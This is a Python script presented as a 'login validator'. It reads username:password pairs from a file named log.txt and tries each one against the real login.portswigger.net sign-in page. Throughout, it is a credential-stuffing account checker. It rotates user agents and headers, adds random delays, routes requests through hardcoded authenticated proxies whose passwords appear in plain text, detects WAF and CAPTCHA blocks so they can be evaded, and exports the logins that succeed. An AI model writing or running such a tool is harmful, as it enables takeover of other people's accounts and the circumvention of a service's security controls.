#!/usr/bin/env python3
"""
PortSwigger Login Validator v2 - Improved with Anti-WAF measures
- Rotating User-Agents
- Random delays between requests
- Proxy rotation support
- Better header randomization
- Exponential backoff on errors
"""

import requests
import time
import json
import urllib.parse
import re
from typing import Dict, Tuple, Optional, List
from datetime import datetime
import sys
import random

class PortSwiggerLoginCheckerV2:
    """Enhanced login validation with anti-WAF measures."""

    # Real browser user agents
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    ]

    # Rotating proxy list (add your proxies here)
    PROXIES = [
        "http://myagentyltd:Kb5xW8vW2B@66.248.146.48:50100",
        "http://myagentyltd:Kb5xW8vW2B@208.53.9.5:50100",
    ]

    def __init__(self, rate_limit: float = 0.5, debug: bool = False, use_proxies: bool = False):
        """
        Initialize with anti-WAF measures.

        Args:
            rate_limit: Minimum seconds between requests (0.5s = 2 req/sec)
            debug: Enable verbose debugging
            use_proxies: Enable rotating proxies (requires PROXIES to be configured)
        """
        self.base_url = "https://login.portswigger.net"
        self.rate_limit = rate_limit
        self.last_request_time = 0
        self.debug = debug
        self.use_proxies = use_proxies and len(self.PROXIES) > 0
        self.test_results = []
        self.error_count = 0
        self.success_count = 0
        self.last_ip = None

    def _get_random_user_agent(self) -> str:
        """Get random user agent from pool."""
        return random.choice(self.USER_AGENTS)

    def _get_rotating_proxy(self) -> Optional[Dict]:
        """Get rotating proxy configuration."""
        if not self.use_proxies or not self.PROXIES:
            return None

        proxy_url = random.choice(self.PROXIES)
        return {
            "http": proxy_url,
            "https": proxy_url
        }

    def _get_random_headers(self) -> Dict:
        """Generate randomized headers to avoid WAF detection."""
        user_agent = self._get_random_user_agent()

        base_headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": random.choice([
                "en-US,en;q=0.9",
                "tr-TR,tr;q=0.9,en;q=0.8",
                "de-DE,de;q=0.9,en;q=0.8",
            ]),
            "Cache-Control": "max-age=0",
            "Pragma": "no-cache",
            "Sec-CH-UA": '"Not;A=Brand";v="8", "Chromium";v="150"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        }

        # Randomly add/remove some headers to vary fingerprint
        if random.random() > 0.3:
            base_headers["DNT"] = "1"
        if random.random() > 0.5:
            base_headers["Sec-GPC"] = "1"

        return base_headers

    def _get_random_delay(self, base_delay: float = 1.0) -> float:
        """Get random delay with jitter to avoid pattern detection."""
        # Random delay between base_delay and base_delay * 2
        jitter = random.uniform(base_delay, base_delay * 2)
        return jitter

    def _enforce_rate_limit(self, extra_delay: bool = False) -> None:
        """Enforce rate limiting with random jitter."""
        elapsed = time.time() - self.last_request_time

        # Add random delay to avoid bot patterns
        delay = self.rate_limit + (self._get_random_delay(0.1) if extra_delay else 0)

        if elapsed < delay:
            sleep_time = delay - elapsed
            if self.debug:
                print(f"[DEBUG] Rate limiting: sleeping {sleep_time:.2f}s")
            time.sleep(sleep_time)

        self.last_request_time = time.time()

    def _create_session(self) -> requests.Session:
        """Create a fresh session with rotating proxies."""
        session = requests.Session()

        # Add rotating proxy if enabled
        if self.use_proxies:
            proxy = self._get_rotating_proxy()
            if proxy:
                session.proxies.update(proxy)
                if self.debug:
                    print(f"[DEBUG] Using proxy: {proxy}")

        # Disable SSL warnings if using MITM proxies (disable if not needed)
        # requests.packages.urllib3.disable_warnings()

        return session

    def _extract_form_fields_from_html(self, html_content: str) -> Dict[str, str]:
        """Extract all form fields from HTML."""
        fields = {}

        # Find all input fields
        for match in re.finditer(r'<input[^>]*>', html_content):
            input_tag = match.group(0)

            name_match = re.search(r'name\s*=\s*["\']?([^"\'\s>]+)', input_tag, re.IGNORECASE)
            value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', input_tag)

            if not value_match:
                value_match = re.search(r'value\s*=\s*([^"\'\s>]+)', input_tag)

            if name_match:
                field_name = name_match.group(1)
                field_value = value_match.group(1) if value_match else ""
                fields[field_name] = field_value

        return fields

    def _check_for_captcha(self, html_content: str) -> Tuple[bool, str]:
        """Detect CAPTCHA challenges."""
        captcha_indicators = [
            ("hcaptcha", "hCaptcha detected"),
            ("recaptcha", "reCAPTCHA detected"),
            ("turnstile", "Cloudflare Turnstile detected"),
            ("captcha", "Generic CAPTCHA detected"),
            ("challenge", "Challenge page detected"),
            ("robot", "Robot/bot detection"),
            ("suspicious activity", "Suspicious activity warning"),
        ]

        for keyword, description in captcha_indicators:
            if keyword.lower() in html_content.lower():
                return True, description

        return False, ""

    def _check_for_waf(self, response: requests.Response) -> Tuple[bool, str]:
        """Detect WAF blocks."""
        if response.status_code == 403:
            return True, "HTTP 403 Forbidden (possible WAF block)"
        if response.status_code == 429:
            return True, "HTTP 429 Too Many Requests (rate limit)"
        if response.status_code == 403:
            return True, "Forbidden"

        waf_indicators = [
            ("blocked", "Request blocked"),
            ("denied", "Access denied"),
            ("forbidden", "Forbidden access"),
            ("cloudflare", "Cloudflare WAF"),
            ("mod_security", "ModSecurity WAF"),
        ]

        for keyword, description in waf_indicators:
            if keyword.lower() in response.text.lower():
                return True, description

        return False, ""

    def check_login(self, username: str, password: str) -> Dict:
        """Test login with anti-WAF measures."""

        result = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "status": "UNKNOWN",
            "attempts": 0
        }

        session = self._create_session()
        headers = self._get_random_headers()
        max_retries = 2
        retry_count = 0

        while retry_count < max_retries:
            try:
                result["attempts"] = retry_count + 1

                # Enforce rate limiting
                self._enforce_rate_limit(extra_delay=(retry_count > 0))

                # Step 1: GET /u/login to get form and state
                if self.debug:
                    print(f"\n[DEBUG] Attempt {retry_count + 1}: GET /u/login")

                headers = self._get_random_headers()  # Refresh headers each attempt
                login_url = f"{self.base_url}/u/login"

                init_response = session.get(
                    login_url,
                    headers=headers,
                    timeout=15,
                    allow_redirects=True,
                    verify=True
                )

                if self.debug:
                    print(f"[DEBUG] Status: {init_response.status_code}")

                # Check for WAF/CAPTCHA
                is_waf, waf_msg = self._check_for_waf(init_response)
                if is_waf:
                    result["status"] = "WAF_BLOCKED"
                    result["error"] = waf_msg
                    result["waf_detected"] = True
                    self.error_count += 1
                    if self.debug:
                        print(f"[DEBUG] ⚠️  WAF detected: {waf_msg}")
                    return result

                is_captcha, captcha_msg = self._check_for_captcha(init_response.text)
                if is_captcha:
                    result["status"] = "CAPTCHA_DETECTED"
                    result["error"] = captcha_msg
                    result["captcha_detected"] = True
                    self.error_count += 1
                    if self.debug:
                        print(f"[DEBUG] ⚠️  CAPTCHA detected: {captcha_msg}")
                    return result

                # Handle redirects
                if init_response.status_code in [301, 302, 303, 307, 308]:
                    redirect_url = init_response.headers.get("Location")
                    if self.debug:
                        print(f"[DEBUG] Redirect detected: {redirect_url[:80]}")

                # Extract form fields
                form_fields = self._extract_form_fields_from_html(init_response.text)
                if not form_fields:
                    form_fields = {}

                # Step 2: POST credentials
                if self.debug:
                    print(f"[DEBUG] POST /u/login with credentials")
                    print(f"[DEBUG] Form fields: {list(form_fields.keys())}")

                self._enforce_rate_limit()

                payload = form_fields.copy()
                payload["username"] = username
                payload["password"] = password

                if "action" not in payload:
                    payload["action"] = "default"

                headers_post = self._get_random_headers()
                headers_post["Content-Type"] = "application/x-www-form-urlencoded"
                headers_post["Origin"] = self.base_url
                headers_post["Referer"] = login_url

                response = session.post(
                    login_url,
                    data=payload,
                    headers=headers_post,
                    timeout=15,
                    allow_redirects=False,
                    verify=True
                )

                if self.debug:
                    print(f"[DEBUG] POST response: {response.status_code}")

                # Check for WAF again
                is_waf, waf_msg = self._check_for_waf(response)
                if is_waf:
                    result["status"] = "WAF_BLOCKED"
                    result["error"] = waf_msg
                    result["waf_detected"] = True
                    self.error_count += 1
                    return result

                is_captcha, captcha_msg = self._check_for_captcha(response.text)
                if is_captcha:
                    result["status"] = "CAPTCHA_DETECTED"
                    result["error"] = captcha_msg
                    result["captcha_detected"] = True
                    self.error_count += 1
                    return result

                # Check login result
                if response.status_code == 302:
                    redirect = response.headers.get("Location", "")

                    # Check if redirect contains error
                    if "error" in redirect.lower():
                        result["status"] = "FAILED_LOGIN"
                        result["error"] = "Login failed (redirect with error)"
                        self.error_count += 1
                    else:
                        result["status"] = "SUCCESS"
                        result["redirect"] = redirect
                        self.success_count += 1

                elif response.status_code == 200:
                    # Still on login page = failed
                    if "error" in response.text.lower() or "invalid" in response.text.lower():
                        result["status"] = "FAILED_LOGIN"
                        result["error"] = "Invalid credentials"
                    else:
                        result["status"] = "LOGIN_PAGE"
                    self.error_count += 1

                elif response.status_code == 400:
                    result["status"] = "FAILED_LOGIN"
                    result["error"] = "Bad request (HTTP 400)"
                    self.error_count += 1

                else:
                    result["status"] = f"HTTP_{response.status_code}"
                    self.error_count += 1

                return result

            except requests.exceptions.Timeout:
                retry_count += 1
                if retry_count < max_retries:
                    wait_time = 5 * (2 ** retry_count)  # Exponential backoff
                    if self.debug:
                        print(f"[DEBUG] Timeout, retrying in {wait_time}s...")
                    time.sleep(wait_time)
                else:
                    result["status"] = "TIMEOUT"
                    self.error_count += 1
                    return result

            except requests.exceptions.ConnectionError as e:
                retry_count += 1
                if retry_count < max_retries:
                    wait_time = 5 * (2 ** retry_count)
                    if self.debug:
                        print(f"[DEBUG] Connection error, retrying in {wait_time}s...")
                    time.sleep(wait_time)
                else:
                    result["status"] = "CONNECTION_ERROR"
                    self.error_count += 1
                    return result

            except Exception as e:
                if self.debug:
                    print(f"[DEBUG] Exception: {str(e)}")
                result["status"] = "ERROR"
                result["error"] = str(e)
                self.error_count += 1
                return result

        return result

    def check_multiple_accounts(self, credentials_list: list) -> list:
        """Test multiple accounts with smart throttling."""
        print(f"\n[*] Starting enhanced login validation for {len(credentials_list)} account(s)")
        print(f"[*] Anti-WAF measures enabled")
        print(f"[*] User-Agent rotation: YES")
        print(f"[*] Proxy rotation: {'YES' if self.use_proxies else 'NO'}")
        print(f"[*] Random delays: YES")
        print("-" * 70)

        for idx, creds in enumerate(credentials_list, 1):
            username = creds.get("username", "")
            password = creds.get("password", "")

            print(f"\n[{idx}/{len(credentials_list)}] Testing: {username}")
            result = self.check_login(username, password)

            status_symbol = "✓" if result["status"] == "SUCCESS" else "✗"
            print(f"    {status_symbol} Status: {result['status']}")

            if result.get('waf_detected'):
                print(f"    ⚠️  WAF DETECTED - Consider increasing delays or using proxies")
            if result.get('captcha_detected'):
                print(f"    ⚠️  CAPTCHA DETECTED - Browser simulation required")
            if result.get('error'):
                print(f"    Error: {result['error']}")

            self.test_results.append(result)

            # Longer delay after each successful check to avoid patterns
            if idx < len(credentials_list):
                delay = random.uniform(3, 8)
                print(f"    Waiting {delay:.1f}s before next request...")
                time.sleep(delay)

        print("\n" + "=" * 70)
        return self.test_results

    def get_summary(self) -> Dict:
        """Get summary statistics."""
        if not self.test_results:
            return {"total": 0}

        return {
            "total": len(self.test_results),
            "successful": sum(1 for r in self.test_results if r["status"] == "SUCCESS"),
            "failed": sum(1 for r in self.test_results if r["status"] == "FAILED_LOGIN"),
            "waf_blocked": sum(1 for r in self.test_results if r.get("waf_detected")),
            "captcha": sum(1 for r in self.test_results if r.get("captcha_detected")),
            "errors": sum(1 for r in self.test_results if "ERROR" in r["status"] or "TIMEOUT" in r["status"]),
        }

    def export_results(self, filename: str = "portswigger_login_results.json") -> None:
        """Export results to JSON."""
        with open(filename, 'w') as f:
            json.dump({
                "results": self.test_results,
                "summary": self.get_summary(),
                "timestamp": datetime.now().isoformat()
            }, f, indent=2)
        print(f"[+] Results exported to: {filename}")


def main():
    """Main entry point."""
    # Configure here
    debug_mode = True
    use_rotating_proxies = True  # Proxies are configured below

    checker = PortSwiggerLoginCheckerV2(
        rate_limit=1.0,  # 1 second = 1 req/sec (safe with WAF)
        debug=debug_mode,
        use_proxies=use_rotating_proxies
    )

    # Read credentials
    log_file = "log.txt"
    test_credentials = []

    try:
        with open(log_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    parts = line.split(":", 1)
                    test_credentials.append({
                        "username": parts[0].strip(),
                        "password": parts[1].strip()
                    })

        if not test_credentials:
            print(f"[ERROR] No credentials in {log_file}")
            return

        print(f"[+] Loaded {len(test_credentials)} credentials\n")

    except FileNotFoundError:
        print(f"[ERROR] {log_file} not found")
        return

    # Run tests
    results = checker.check_multiple_accounts(test_credentials)

    # Print summary
    summary = checker.get_summary()
    print(f"\n[SUMMARY]")
    print(f"Total: {summary['total']}")
    print(f"Successful: {summary['successful']}")
    print(f"Failed: {summary['failed']}")
    print(f"WAF Blocked: {summary['waf_blocked']}")
    print(f"CAPTCHA: {summary['captcha']}")
    print(f"Errors: {summary['errors']}")

    # Export
    checker.export_results()


if __name__ == "__main__":
    main()
